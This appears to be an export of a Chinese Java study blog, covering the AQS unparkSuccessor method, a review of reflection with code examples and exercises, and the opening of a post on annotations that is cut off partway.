<span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">unparkSuccessor</span><span class="token punctuation">(</span><span class="token class-name">Node</span> node<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/*
         * If status is negative (i.e., possibly needing signal) try
         * to clear in anticipation of signalling.  It is OK if this
         * fails or if status is changed by waiting thread.
         */</span>
				<span class="token comment">// 注意这个的node是AQS的头结点，判断status值</span>
        <span class="token keyword">int</span> ws <span class="token operator">=</span> node<span class="token punctuation">.</span>waitStatus<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>ws <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token comment">// 将头结点的值设置为0</span>
            <span class="token function">compareAndSetWaitStatus</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> ws<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">/*
         * Thread to unpark is held in successor, which is normally
         * just the next node.  But if cancelled or apparently null,
         * traverse backwards from tail to find the actual
         * non-cancelled successor.
         */</span>
        <span class="token comment">// 获取到哨兵节点后第一个阻塞节点</span>
        <span class="token class-name">Node</span> s <span class="token operator">=</span> node<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> s<span class="token punctuation">.</span>waitStatus <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            s <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Node</span> t <span class="token operator">=</span> tail<span class="token punctuation">;</span> t <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> t <span class="token operator">!=</span> node<span class="token punctuation">;</span> t <span class="token operator">=</span> t<span class="token punctuation">.</span>prev<span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>t<span class="token punctuation">.</span>waitStatus <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>
                    s <span class="token operator">=</span> t<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
            <span class="token comment">// 这里我们可以看到被阻塞的线程被唤醒了</span>
            <span class="token class-name">LockSupport</span><span class="token punctuation">.</span><span class="token function">unpark</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>thread<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>集合</tag>
        <tag>锁</tag>
      </tags>
  </entry>
  <entry>
    <title>反射复习</title>
    <url>//post/Java/%E5%8F%8D%E5%B0%84%E5%A4%8D%E4%B9%A0.html</url>
    <content><![CDATA[<h1 id="反射复习"><a href="#反射复习" class="headerlink" title="反射复习"></a>反射复习</h1><h2 id="能干嘛"><a href="#能干嘛" class="headerlink" title="能干嘛"></a>能干嘛</h2><p>​    当我们创建一个对象时，需要事先在源码中进行编写，例如：<code>new Object()</code>,但如果未来发生变化，我就不得不在源码中进行修改，这也违反了开闭原则，我们能不能仅修改配置文件就可以调整系统中需要创建的类。比如说我在配置文件写:</p>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">classPathName</span><span class="token punctuation">=</span><span class="token value attr-value">org.Mysql.SQLBuilder</span>
<span class="token key attr-name">mathod</span><span class="token punctuation">=</span><span class="token value attr-value">getSqlSession</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>​    我想未来我的系统可以读取该配置文件，知道需要的是一个<code>org.Mysql.SQLBuilder</code>类，并且调用<code>getSqlSession</code>方法。等到未来如果修改成：</p>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">classPathName</span><span class="token punctuation">=</span><span class="token value attr-value">org.Oracle.SQLBuilder</span>
<span class="token key attr-name">mathod</span><span class="token punctuation">=</span><span class="token value attr-value">getSqlSessions</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>​    那系统也能动态的感知到现在需要的是<code>org.Oracle.SQLBuilder</code>,并要调用<code>getSqlSessions</code>方法。在使用反射前我们是无法解决的，因为所有使用的类，在编译期就固定了。所以引出了反射技术。也就是为了在运行期，可动态获取类信息或者创建对象。</p>
<p>​    这在我们学习框架例如Spring，Mybatis时就经常使用，比如我想动态的获取<code>@Table(name=&quot;my_db&quot;)</code>注解内的内容，就可以通过反射来进行获取。</p>
<blockquote>
<p>具体功能：</p>
</blockquote>
<ol>
<li><p>在运行时判断任意一个对象所属的类  （</p>
</li>
<li><p>在运行时构造任意一个类对象   </p>
</li>
<li><p>在运行时得到任意一个类所具有的的成员方法和方法</p>
</li>
<li><p>在运行时调用任意一个对象的成员变量和方法</p>
</li>
<li><p>生成动态代理</p>
</li>
</ol>
<h2 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h2><p>​    反射机制允许程序在执行期间借助<code>Reflection API</code>，获取任何类的内部信息（比如：成员变量，构造器，成员方法等），并能操作属性和方法。</p>
<p>​    当JVM加载完类后，会在堆中产生一个Class类型的对象（一个类只有一个Class对象），这个类对象包含了类的完整结构信息。</p>
<blockquote>
<p>Java反射机制原理图</p>
</blockquote>
<p><img src="../../typora-user-images/image-20221203151322560.png" alt="image-20221203151322560"></p>
<blockquote>
<p>类加载过程</p>
</blockquote>
<p><img src="../../typora-user-images/image-20221203155444189.png" alt="image-20221203155444189"></p>
<p><img src="../../typora-user-images/image-20221203155504141.png" alt="image-20221203155504141"></p>
<p>​        简单来说就是我们写成的源码，在被JVM加载后，会对每个类生成唯一的Class对象，每当我们实例化一个对象时，这个对象的对象头都有一个指针指向对象所属的唯一的Class对象。</p>
<p>​        当我们获取到Class对象时，我们可以知道Class成员变量，方法，构造器，并进行任意的使用。</p>
<blockquote>
<p>其中最主要的几个类：</p>
</blockquote>
<ol>
<li><strong>Java.lang.Class</strong> 表示一个类</li>
<li><strong>Java.lang.reflect.Method</strong>  表示方法</li>
<li><strong>Java.lang.reflect.Field</strong>   表示成员变量</li>
<li><strong>Java.lang.reflect.Constructor</strong>   表示构造器</li>
</ol>
<p>​        其中Method，Field，Constructor都有<code>getModifiers()</code>以int形式返回修饰符(private，protect，public)</p>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">0: 默认
1: public
2: private
4: protected
8: static
16: fianl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    public(1) + static(8) = 9  这样就可以判断出一些信息。</p>
<h2 id="怎么用"><a href="#怎么用" class="headerlink" title="怎么用"></a>怎么用</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  	<span class="token comment">// 找到String的类对象</span>
    <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> aClass <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
  	<span class="token comment">// 获取字段 public</span>
    <span class="token class-name">Field</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fields <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  	<span class="token comment">// 获取方法 public</span>
    <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> methods <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  	<span class="token comment">// 获取构造器 public</span>
    <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> constructors <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  	<span class="token comment">// 所有修饰符的都可以获取到</span>
    aClass<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    aClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    aClass<span class="token punctuation">.</span><span class="token function">getDeclaredConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>反射的优缺点：</p>
</blockquote>
<ol>
<li>优点：可以动态创建和使用对象</li>
<li>缺点：反射基本是解释执行，对执行速度有影响</li>
</ol>
<blockquote>
<p>我们可代码验证</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> demo <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> time <span class="token operator">=</span> <span class="token number">10000000</span><span class="token punctuation">;</span>
        <span class="token comment">// 正常方式：</span>
        <span class="token class-name">Cat</span> cat <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">long</span> start <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> time<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            cat<span class="token punctuation">.</span><span class="token function">hi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">long</span> end <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"正常调用："</span><span class="token operator">+</span> <span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 反射方式：</span>
        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">Cat</span><span class="token punctuation">></span></span> aClass <span class="token operator">=</span> cat<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Cat</span> cat1 <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Method</span> hi <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"hi"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        start <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> time<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            hi<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>cat1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        end <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"反射调用："</span><span class="token operator">+</span> <span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token comment">// 结果： </span>
        <span class="token comment">// 正常调用：9</span>
        <span class="token comment">// 反射调用：84</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">Cat</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">hi</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    Method和Field和Constructor对象都有<code>setAccessible()</code>方法,setAccessible作用是启动和禁止访问安全检查的开关。当setAccessible(true)表示反射的对象在使用时取消访问检查，提高反射的效率，为false则表示执行访问检查。当我们修改上述代码：<code>hi.setAccessible(true);</code>，最终执行速度可以快一倍左右。</p>
<p>​    并且当我们访问<code>private</code>修饰的变量，方法，构造器时，如果不设置<code>setAccessible()</code>会爆出：<code>java.lang.IllegalAccessException</code>; 如果设置则可正常访问。</p>
<h4 id="Class类"><a href="#Class类" class="headerlink" title="Class类"></a>Class类</h4><p><img src="../../typora-user-images/image-20221203154354105.png" alt="image-20221203154354105"></p>
<ol>
<li>Class也是类，继承Object。</li>
<li>Class类不是new出来的，而是系统创建的</li>
<li>某个类的Class类对象，在内存只有一份，因为类只加载一次 （如果多线程同时进行同一个类加载，会导致阻塞）</li>
<li>每个类的实例都知道自己是哪个Class实例的</li>
<li>通过Class对象可以完整的获取一个类的完整结构</li>
<li>Class对线是存放在堆的</li>
<li>类的字节码二进制数据，是放在方法区的，也称为元数据。</li>
</ol>
<blockquote>
<p>Class类的常用方法：</p>
</blockquote>
<p><img src="../../typora-user-images/image-20221203155854410.png" alt="image-20221203155854410"></p>
<blockquote>
<p>如何获取Class类</p>
</blockquote>
<ol>
<li>已经知道全类名：<code>Class.forName(&quot;className&quot;)</code>,常用语配置文件读取，加载类</li>
<li>已经知道具体的类：<code>Class clas = Cat.class</code>,性能最好，一般用在参数传递</li>
<li>已经知道类的实例：<code>Class clas = cat.getClass()</code></li>
<li>包装类型：<code>Class i = Inteager().Type</code></li>
<li>基本数据类型：int.class</li>
</ol>
<blockquote>
<p>哪些类型有Class对象</p>
</blockquote>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token list punctuation">1.</span> 类
<span class="token list punctuation">2.</span> 接口
<span class="token list punctuation">3.</span> 数组
<span class="token list punctuation">4.</span> 枚举
<span class="token list punctuation">5.</span> 注解
<span class="token list punctuation">6.</span> 基本数据类型
<span class="token list punctuation">7.</span> void<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="最终测试"><a href="#最终测试" class="headerlink" title="最终测试"></a>最终测试</h2><p>测试1：</p>
<p>​    定义PrivateTest类，私有属性name，属性值为hellokitty</p>
<ol>
<li>提供getName的公有方法</li>
<li>利用Class类获取私有的name属性，修改属性值，并调用getName方法，打印name属性</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> demo <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">PrivateTest</span><span class="token punctuation">></span></span> aClass <span class="token operator">=</span> <span class="token class-name">PrivateTest</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
        <span class="token class-name">PrivateTest</span> instance <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> name <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        name<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        name<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>instance<span class="token punctuation">,</span><span class="token string">"wangCai"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Method</span> getName <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>getName<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>instance<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">PrivateTest</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token string">"hellokitty"</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>测试2：</p>
<ol>
<li>反射获取File类的Class对象</li>
<li>在控制台打印File类的所有构造器</li>
<li>通过newInstance创建File对象，并创建一个本地文件</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> demo <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> aClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.io.File"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> constructors <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>constructors<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> constructor <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"doc.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        file<span class="token punctuation">.</span><span class="token function">createNewFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>反射</tag>
      </tags>
  </entry>
  <entry>
    <title>注解开发应用</title>
    <url>//post/Java/%E6%B3%A8%E8%A7%A3%E5%BC%80%E5%8F%91.html</url>
    <content><![CDATA[<h1 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h1><p>在Java基础中我们都学习过简单的注解开发，但并不没有意识到重要性，直到使用了SpringBoot后，我们看到了注解相比原先配置文件的大量定义的简洁与优雅。在测试中我们也常用注解：@Test  ，在方法定义时加上该注解，我们便可以执行这个方法，这到底怎么做的呢？ 本文将回顾注解基础，并衍生到具有应用：</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">METHOD</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">SOURCE</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">Override</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的代码大家都很熟悉，当我们子类重新父类的方法时，会带有该注解。而我们在声明一个注解时，</p>
<ul>
<li>首先需要使用 @Interface 来定义，这和我们定义 class，Interface 一样，最终编译时也会生成一个 class 文件</li>
<li>其次需要 @Target 和 @Retention 来定义该注解的作用域，这也被称为元注解，下面我们看看它们常用的范围</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">ElementType</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">/** 类, 接口 (包含注解), 枚举
    TYPE,
    /** 字段 */</span>
    <span class="token constant">FIELD</span><span class="token punctuation">,</span>
    <span class="token comment">/** 方法 */</span>
    <span class="token constant">METHOD</span><span class="token punctuation">,</span>
    <span class="token comment">/** 参数 */</span>
    <span class="token constant">PARAMETER</span><span class="token punctuation">,</span>
    <span class="token comment">/** 构造器 */</span>
    <span class="token constant">CONSTRUCTOR</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">RetentionPolicy</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">/**
     * 被编译器丢弃
     */</span>
    <span class="token constant">SOURCE</span><span class="token punctuation">,</span>
    <span class="token comment">/**
     * 在class文件中可用，但被vm丢弃
     */</span>
    <span class="token constant">CLASS</span><span class="token punctuation">,</span>
    <span class="token comment">/**
     * 运行时可用，可通过反射读取
     */</span>
    <span class="token constant">RUNTIME</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>注解的作用是什么？</p>
</blockquote>
<p>可以提供用来完整描述程序所需要的信息，而这些信息无法用Java来表达，或者是不方便表达。</p>
<blockquote>
<p>如何使用呢？</p>
</blockquote>
<p>如果你学过Mybatis这种orm框架，会知道想将数据库字段与Java类相映射，我们需要使用XML文件来做配对，比如：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resultMap</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userResultMap<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>User<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_id<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_name<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_age<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>age<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resultMap</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看着很直观，但有个问题，如果我的User类中的字段名要修改，我还需要再XML文件中再调整。但如果使用注解</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Table</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"User"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">&#123;</span>
  <span class="token annotation punctuation">@Id</span>
